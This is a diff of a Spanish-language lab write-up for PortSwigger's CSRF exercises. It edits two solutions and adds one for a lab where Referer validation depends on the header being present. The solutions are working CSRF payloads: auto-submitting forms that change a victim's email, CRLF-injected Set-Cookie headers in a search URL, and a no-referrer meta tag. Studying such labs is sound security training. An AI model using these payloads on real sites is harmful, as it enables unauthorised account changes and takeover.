@@ -458,7 +458,7 @@ Caso muy similar al anterior, pero se explota la falta de protección csrf en la
      <input type="hidden" name="email" value="algo@mail.com">
      <input type="hidden" name="csrf" value="AC99lyKRB1kwqqNclxVT71NsvOYkhcjv">
 </form>
-<img src="/?search=test%0d%0aSet-Cookie:%20csrfKey=bPn9hLl0tvfI5hmsh7vnKuFh0auOpLjP" onerror="document.forms[0].submit()">
+<img src="https://ac0f1f011f77ebbc80c6239100e400e0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=bPn9hLl0tvfI5hmsh7vnKuFh0auOpLjP" onerror="document.forms[0].submit()">
 ```
 
 ### [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
@@ -471,9 +471,25 @@ Caso muy similar al anterior, también se explota la falta de protección csrf e
 ```html
 <form method="POST" action="https://acfa1f351e61acce80a95395003a0017.web-security-academy.net/email/change-email">
      <input type="hidden" name="email" value="algo@mail.com">
-     <input type="hidden" name="csrf" value="fake">
+     <input type="hidden" name="csrf" value="algo">
 </form>
-<img src="https://acfa1f351e61acce80a95395003a0017.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
+<img src="https://acfa1f351e61acce80a95395003a0017.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=algo" onerror="document.forms[0].submit()">
+```
+
+### [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
+
+Autenticados en el laboratorio, ejecutamos la funcionalidad Change Email interceptando la request con burpsuite, y poniendo atención en el header Referer, notamos que si lo cambiamos, la request es rechazada, pero si la borramos, vuelve a ser aceptada. Para suprimir el header Referer incluimos la primera línea del siguiente exploit.
+
+#### Solución:
+
+```html
+<meta name="referrer" content="no-referrer">
+<form method="POST" action="https://ac7e1f411e7ba82f8084503a004700a7.web-security-academy.net/email/change-email">
+     <input type="hidden" name="email" value="algo@mail.com">
+</form>
+<script>
+      document.forms[0].submit();
+</script>
 ```
 
 ---
